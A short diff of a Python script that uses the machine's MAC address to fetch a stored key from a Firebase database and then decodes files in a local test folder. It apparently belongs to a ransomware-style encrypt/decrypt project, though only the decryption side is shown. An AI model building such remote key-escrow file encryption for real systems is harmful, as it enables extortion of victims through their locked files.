@@ -51,23 +51,12 @@ testPath = 'C:/Users/tmdgh/Desktop/test124/'
 
 mac = get_mac()
 password = str(mac)
-print(password)
 
 firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
 users = firebase.get('/user' + '/' + password, None)
-print(users)
-hawi = list(users.values())[0]["Base"]
-print(hawi)
 
-iv = hawi[2:IV_SIZE+2]
-print(iv)
-iv = iv.encode()
-print(iv)
+base2 = list(users.values())[0]["Base"]
+base = base2.encode('latin-1')
 
-key= hawi[IV_SIZE+2:]
-print(key)
-key = key.encode()
-print(key)
-
-#print("decoding")
-#search_dec(testPath)
+print("decoding")
+search_dec(testPath)
